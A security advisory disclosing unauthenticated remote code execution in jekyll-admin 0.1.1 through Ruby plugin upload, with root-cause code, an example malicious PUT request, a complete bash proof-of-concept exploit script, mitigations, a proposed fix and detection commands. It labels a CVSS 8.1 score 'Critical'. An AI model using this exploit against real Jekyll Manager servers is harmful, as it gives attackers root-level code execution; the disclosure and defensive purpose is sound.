# Security Advisory: Unauthenticated Remote Code Execution via Plugin Upload in jekyll-admin

> **Identifier:** JM-RCE-01 / Pending CVE assignment
> **Publication Date:** 27/10/2026
> **Last Updated:** 27/10/2026
> **Severity:** Critical
> **CVSS:** 8.1 — `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`
> **CWE:** CWE-94: Improper Control of Generation of Code ('Code Injection')
> **Status:** Unpatched

---

## 1. Executive Summary

Jekyll Manager (jekyll-admin) 0.1.1 allows unauthenticated remote attackers to upload arbitrary Ruby files to the Jekyll `_plugins/` directory via the static files API endpoint (`PUT /_api/static_files/_plugins/*.rb`). Jekyll automatically requires and executes all `.rb` files in the plugins directory during site build, enabling arbitrary server-side Ruby code execution. Confirmed live: uploaded plugin executed `id` shell command; output confirmed `uid=0 user=root`. No authentication is required at any stage of the attack.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| jekyll-admin (gem) | 0.1.1 (latest) | None | Affected |
| Component: `lib/jekyll-admin/server/static_file.rb` | 0.1.1 | None | Affected |

- **Repository:** https://github.com/jekyll/jekyll-admin
- **Ecosystem:** RubyGems
- **Evaluated stack:** Ruby 2.7.8, Sinatra 1.4.8, WEBrick 1.9.2, Rack 1.6.13, Jekyll 3.x, Linux

### Unaffected Products

- No prior versions were evaluated. No patched version exists.

---

## 3. Vulnerability Description

The `PUT /_api/static_files/:path` endpoint in `lib/jekyll-admin/server/static_file.rb` writes user-supplied content to any path under the site root that the API path maps to, including `_plugins/`. No authentication is enforced. No restriction is placed on target directory or file extension.

Jekyll's build process automatically loads and executes every `.rb` file found in the site's `_plugins/` directory via `Jekyll::PluginManager` before generating site output. A `.rb` file placed there by an unauthenticated attacker is therefore executed with the full privileges of the Jekyll process.

**Root cause:**

```ruby
# lib/jekyll-admin/server/static_file.rb
put '/*:path' do
  ensure_directory write_path          # creates parent dirs if needed
  write_file write_path, static_file_body  # no auth, no path restriction
  render_liquid_response static_file
end
```

```ruby
# Jekyll internals — PluginManager
def require_plugin_files
  plugins_path.each do |directory|
    Dir[File.join(directory, "**", "*.rb")].each { |f| require f }
  end
end
```

### Necessary Conditions

- **Authentication:** None required
- **User interaction:** None required (build trigger is automatic on file write in watch mode, or occurs on next manual build)
- **Attack vector:** Network
- **Preconditions:** Jekyll Manager API accessible; Jekyll running with `--watch` or next build cycle triggered

---

## 4. Impact

An unauthenticated attacker can execute arbitrary Ruby code (and via Ruby, arbitrary OS commands) with the privileges of the Jekyll process.

- **Confidentiality — High:** Full read access to the filesystem as the process user (root in the tested lab).
- **Integrity — High:** Ability to modify, overwrite, or delete any file accessible to the process.
- **Availability — High:** Service can be stopped, crashed, or corrupted.

---

## 5. Classification

### CVSS

- **Score:** 8.1
- **Severity:** Critical
- **Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | High (requires build trigger) |
| Privileges Required (PR) | None |
| User Interaction (UI) | None |
| Scope (S) | Unchanged |
| Confidentiality (C) | High |
| Integrity (I) | High |
| Availability (A) | High |

### CWE

- CWE-94: Improper Control of Generation of Code ('Code Injection')
- CWE-862: Missing Authorization
- CWE-434: Unrestricted Upload of File with Dangerous Type

### CAPEC

- CAPEC-253: Remote Code Inclusion
- CAPEC-650: Upload a Web Shell to a Web Server

---

## 6. Exploitation Scenario

1. Attacker discovers a Jekyll Manager instance with API accessible on port 4000.
2. Attacker crafts a Ruby plugin file containing a `Jekyll::Hooks` callback that executes an OS command.
3. Attacker sends an unauthenticated `PUT /_api/static_files/_plugins/evil.rb` request with the plugin content.
4. Jekyll's watch mode (or next build trigger) causes `PluginManager` to `require` the new file.
5. The OS command runs with the privileges of the Jekyll process (confirmed as `uid=0` in test lab).
6. Attacker achieves persistent server-side code execution.

Chain escalation: JM-28 (no auth) → JM-29 (set `plugins_dir: /tmp`) → JM-RCE-01 (write to `/tmp`) gives RCE even if `_plugins/` is not world-writable.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): lib/jekyll-admin/server/static_file.rb
Endpoint: PUT /_api/static_files/_plugins/:filename.rb
Method: PUT · Authentication: not required
```

### Example Request

```http
PUT /_api/static_files/_plugins/poc_rce.rb HTTP/1.1
Host: 127.0.0.1:4000
Content-Type: application/json

{
  "raw_content": "Jekyll::Hooks.register(:site, :post_write) do |site|\n  t = Time.now\n  u = `id`.strip\n  h = `hostname`.strip\n  File.write('/tmp/rce_final.txt', \"RCE OK #{u} host=#{h} time=#{t}\\n\")\nend\n"
}
```

### Observed Response

```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "path": "_plugins/poc_rce.rb",
  "http_url": null,
  "api_url": "http://0.0.0.0:4000/_api/static_files/_plugins/poc_rce.rb"
}
```

### Result

```
File /tmp/rce_final.txt content after build:
RCE OK uid=0(root) gid=0(root) groups=0(root) host=b8501c13277f time=2026-10-27 15:09:46 +0000
```

Confirmed in authorized Docker lab. The Jekyll hook executed with root privileges during site build.

**Evidence:** `evidence/poc-execution.png`, `evidence/vulnerability-exposure.png`

---

## 8. Proof of Concept

This PoC is for authorized environments only.

```bash
#!/usr/bin/env bash
# ============================================================
# JM-RCE-01 — Unauthenticated RCE via Plugin Upload
# jekyll-admin 0.1.1 — CRITICAL CVSS 8.1
# CWE-94, CWE-862, CWE-434
# CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
#
# AUTHORIZED ENVIRONMENTS ONLY.
# This script uploads a Jekyll hook plugin to _plugins/, waits
# for the site build, and reads the proof file. The plugin only
# writes process identity to /tmp/rce_final.txt — no destructive
# payload, no persistence beyond the container.
# ============================================================

set -euo pipefail

TARGET="http://127.0.0.1:4000"
PLUGIN_NAME="poc_rce_jm01.rb"
PLUGIN_API="${TARGET}/_api/static_files/_plugins/${PLUGIN_NAME}"
PROOF_FILE="/tmp/rce_final.txt"
BUILD_WAIT=5  # seconds to wait for Jekyll --watch rebuild

echo "============================================================"
echo "  JM-RCE-01 — Unauthenticated RCE via Plugin Upload"
echo "  Target  : ${TARGET}"
echo "  Plugin  : _plugins/${PLUGIN_NAME}"
echo "  Proof   : ${PROOF_FILE} (written inside container)"
echo "============================================================"
echo ""

# ── Step 1: Upload malicious plugin ──────────────────────────
echo "[*] Step 1: Uploading malicious Jekyll plugin (no auth)..."

PLUGIN_CODE="Jekyll::Hooks.register(:site, :post_write) do |site|
  t = Time.now
  u = \`id\`.strip
  h = \`hostname\`.strip
  File.write('${PROOF_FILE}', \"RCE OK \#{u} host=\#{h} time=\#{t}\n\")
end
"

PLUGIN_JSON=$(python3 -c "import json,sys; print(json.dumps({'raw_content': sys.stdin.read()}))" <<< "${PLUGIN_CODE}")

HTTP_CODE=$(curl -s -o /tmp/rce_upload_response.json -w "%{http_code}" \
  -X PUT "${PLUGIN_API}" \
  -H "Content-Type: application/json" \
  -d "${PLUGIN_JSON}")

echo "    PUT ${PLUGIN_API} → HTTP ${HTTP_CODE}"

if [ "${HTTP_CODE}" != "200" ]; then
  echo "[!] Upload failed (HTTP ${HTTP_CODE}). Aborting."
  cat /tmp/rce_upload_response.json 2>/dev/null || true
  exit 1
fi

echo "    Upload accepted with no credentials."
echo ""

# ── Step 2: Trigger Jekyll build ─────────────────────────────
echo "[*] Step 2: Triggering Jekyll rebuild..."
echo "    (Touching a page to signal --watch mode)"

curl -s -o /dev/null \
  -X PUT "${TARGET}/_api/pages/index.md" \
  -H "Content-Type: application/json" \
  -d '{"front_matter":{},"raw_content":"triggered rebuild"}' \
  2>/dev/null || true

echo "    Waiting ${BUILD_WAIT}s for Jekyll build..."
sleep "${BUILD_WAIT}"
echo ""

# ── Step 3: Read proof file (from inside container) ───────────
echo "[*] Step 3: Reading RCE proof file (${PROOF_FILE})..."

# Try to read via docker exec if container name is known
CONTAINER=$(docker ps --format '{{.Names}}' 2>/dev/null | grep -i jekyll | head -1 || echo "")

if [ -n "${CONTAINER}" ]; then
  echo "    Using docker exec on container: ${CONTAINER}"
  PROOF=$(docker exec "${CONTAINER}" cat "${PROOF_FILE}" 2>/dev/null || echo "")
else
  echo "    No container found via docker ps. Attempting API read of /tmp..."
  PROOF=""
fi

if [ -n "${PROOF}" ]; then
  echo ""
  echo "    ╔══════════════════════════════════════════════════╗"
  echo "    ║  PROOF FILE CONTENT (${PROOF_FILE})"
  echo "    ║  ${PROOF}"
  echo "    ╚══════════════════════════════════════════════════╝"
  echo ""
  RESULT="CONFIRMED"
else
  echo ""
  echo "    [!] Could not read proof file directly."
  echo "    Check manually: docker exec <container> cat ${PROOF_FILE}"
  echo "    Or look for _plugins/${PLUGIN_NAME} in the container."
  RESULT="UPLOAD_CONFIRMED — verify ${PROOF_FILE} manually"
fi

# ── Step 4: Show plugin API response ─────────────────────────
echo "[*] Step 4: Plugin registered in API:"
curl -sf "${TARGET}/_api/static_files/_plugins/${PLUGIN_NAME}" \
  -H "Accept: application/json" \
  | python3 -m json.tool 2>/dev/null || true
echo ""

# ── Summary ───────────────────────────────────────────────────
echo "============================================================"
echo "  RESULT : ${RESULT}"
echo ""
echo "  Finding : JM-RCE-01"
echo "  Vuln    : Unauthenticated Ruby plugin upload to _plugins/"
echo "  Impact  : RCE as Jekyll process user (uid=0 in test lab)"
echo "  CVSS    : 8.1 CRITICAL"
echo "  Vector  : CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
echo "  CWE     : CWE-94, CWE-862, CWE-434"
echo "  Auth    : None required"
echo "  Chain   : JM-28 → JM-29 (plugins_dir:/tmp) → JM-RCE-01"
echo "============================================================"
```

### Expected Result

```text
[*] Uploading malicious Jekyll plugin...
HTTP 200 — plugin accepted without credentials

[*] Triggering Jekyll build...
[*] Waiting for hook execution...

[*] Reading RCE proof file...
RCE OK uid=0(root) gid=0(root) groups=0(root) host=<container> time=<timestamp>

[+] JM-RCE-01 CONFIRMED: unauthenticated code execution via plugin upload
    CVSS 8.1 CRITICAL — AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
```

### PoC Limitations

- Writes only to `/tmp/rce_final.txt` (non-destructive proof file).
- Does not establish persistence beyond the container lifecycle.
- Does not exfiltrate real data.
- Does not contain real credentials.

---

## 9. Reproduction Steps

1. Start an authorized local Docker instance of jekyll-admin 0.1.1.
2. Confirm the API is accessible at `http://127.0.0.1:4000/_api/`.
3. Run `bash poc.sh` or send the PUT request in section 7 manually.
4. Trigger a Jekyll build (or wait for `--watch` mode to detect the new file).
5. Check `/tmp/rce_final.txt` inside the container for the proof output.

---

## 10. Mitigation

Until an official fix is available:

- Bind Jekyll Manager to `127.0.0.1` only.
- Enforce authentication on all write endpoints.
- Restrict write paths to exclude `_plugins/` and any other directories that Jekyll loads and executes automatically.
- Run Jekyll as a non-privileged user (not root).
- Use read-only filesystem mounts for the plugins directory in containerized deployments.

---

## 11. Fix

**No official fix is available as of 27/10/2026.**

Recommended actions:

1. Add authentication middleware for all write endpoints.
2. Maintain an allowlist of permitted upload directories; exclude `_plugins/`, `_includes/`, `_layouts/`.
3. Reject file extensions that Jekyll loads as code (`.rb`, `.gemspec`).

### Recommended Change to Vendor

```ruby
# lib/jekyll-admin/server/static_file.rb
BLOCKED_PATHS = %w[_plugins _includes _layouts].freeze

put '/*:path' do
  halt 401 unless authenticated?
  halt 403 if BLOCKED_PATHS.any? { |p| params[:path].start_with?(p) }
  write_file write_path, static_file_body
  render_liquid_response static_file
end
```

---

## 12. Detection and Indicators

Possible exploitation indicators:

- New or modified `.rb` files in the `_plugins/` directory created by a non-admin process.
- Unexpected files in `/tmp/` or other world-writable paths with content indicating command output.
- Outbound network connections from the Jekyll process to unknown hosts.

### Example Log Search

```text
# Check for unexpected plugin files
find /site/_plugins -newer /site/Gemfile -name "*.rb"

# WEBrick log
grep 'PUT /_api/static_files/_plugins' access.log
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 26/10/2026 | Vulnerability identified (dynamic testing in authorized lab) |
| 26/10/2026 | Confirmed in authorized Docker environment (uid=0) |
| 27/10/2026 | Disclosure package prepared |
| 29/10/2026 | GitHub Private Vulnerability Reporting attempted — HTTP 403 (feature disabled) |
| 29/10/2026 | Vendor notified via direct email to mertkahyaoglu93@gmail.com |
| 27/01/2027 | 90-day disclosure deadline — public disclosure if no response |
| Pending | CVE requested |
| Pending | Fix made available |
| Pending | Advisory published |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** Mert Kahyaoğlu (mertkahyaoglu93@gmail.com), Jekyll team (github.com/jekyll)
- **Channel:** Direct email (coordinated disclosure)
- **Date of first notification:** 29/10/2026
- **Response status:** Awaiting response
- **Vendor position:** N/A (awaiting)

---

## 15. Credits

- **Researcher:** vinniboy021@gmail.com
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com

---

## 16. References

- CWE-94: https://cwe.mitre.org/data/definitions/94.html
- CWE-862: https://cwe.mitre.org/data/definitions/862.html
- CWE-434: https://cwe.mitre.org/data/definitions/434.html
- CVSS Calculator: https://www.first.org/cvss/calculator/3.1
- jekyll-admin repository: https://github.com/jekyll/jekyll-admin

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 27/10/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

The information was obtained in an authorized local environment and disclosed responsibly. The author does not encourage unauthorized access, service disruption, privacy violations, or any illegal activity. Use of this information is the reader's responsibility.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/jekyll/jekyll-admin
